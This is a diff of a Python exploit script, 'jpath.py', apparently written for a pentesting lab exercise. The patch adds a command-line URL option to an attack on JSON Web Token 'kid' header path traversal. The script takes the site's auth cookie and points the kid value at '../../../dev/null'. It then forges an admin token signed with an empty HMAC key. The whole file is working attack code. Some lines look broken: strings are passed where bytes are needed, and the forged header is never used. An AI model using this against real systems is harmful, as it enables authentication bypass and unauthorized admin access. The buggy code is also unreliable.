@@ -4,16 +4,51 @@ import hashlib
 import json
 import requests as req
 from colorama import Fore
+import sys
+import argparse as argp
+from argparse_color_formatter import ColorHelpFormatter
+
 
 MAG = Fore.MAGENTA
 RRED = Fore.LIGHTRED_EX
 CYYAN = Fore.LIGHTCYAN_EX
 RESETT = Fore.RESET
 
-# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
+        
+parser = argp.ArgumentParser(
+    description=__doc__,
+    prog="jpath.py",
+    formatter_class=ColorHelpFormatter, #argp.RawDescriptionHelpFormatter
+    epilog='''
+    This script was made for Moises Tapia
+    ''')
 
-# HEADER = 
-url = 'http://ptl-b0463287-13ca6bf2.libcurl.so/'
+parser.add_argument("-u", "--url",   dest="urlget",
+                    help="""
+                    -u <url> or --url <url>
+                    example: -u http://<url>/
+                    """)
+
+
+jwtpath = parser.parse_args()
+geturl = jwtpath.urlget
+
+
+def print_help():
+    """Print the first Main is the srcrip do not recive some argument"""
+    print(
+    """
+    basic commands: python3 jpath.py [-h] [-u or --url]
+    """)
+
+
+if len(sys.argv) < 2:
+    print_help()
+    sys.exit(1)
+
+#'http://ptl-b0463287-13ca6bf2.libcurl.so/'
+
+url = geturl
 
 s = req.Session()
 
@@ -21,7 +56,11 @@ s = req.Session()
 response = s.get(url)
 headers_info = s.cookies.get_dict()
 
-exploit = "../../../../../../../../../../dev/null" # you can change this path
+exploit = '"kid":"../../../../../../../../../../dev/null"}' # you can change this path 
+exploit_user = {"user":"admin"}
+search = '"kid":"0001"}'
+key = ''
+
 headers_components = ['header', 'payload', 'signature']
 space = headers_info['auth'].split('.')
 
@@ -56,9 +95,17 @@ header_decode = message_bytes.decode('ascii')
 payload_decode = message_bytes2.decode('ascii')
 
 print("HEADER: " + RRED + header_decode + RESETT)
-print(type(header_decode))
 print("PAYLOAD: " + MAG + payload_decode + RESETT)
 
 print("\n" + "Ecode the new payload...."+ "\n")
 
+new_hederjwt = header_decode.replace(search, exploit)
+print(type(new_hederjwt))
 
+#base64.urlsafe_b64encode(json.dumps(new_hederjwt)).rstrip("=")+"."+
+urlstr = base64.urlsafe_b64encode(json.dumps(exploit_user)).rstrip("=")
+
+sig = base64.urlsafe_b64encode(hmac.new(key,urlstr,hashlib.sha256).digest()).decode('utf8').rstrip("=")
+
+
+print(urlstr+"."+sig)
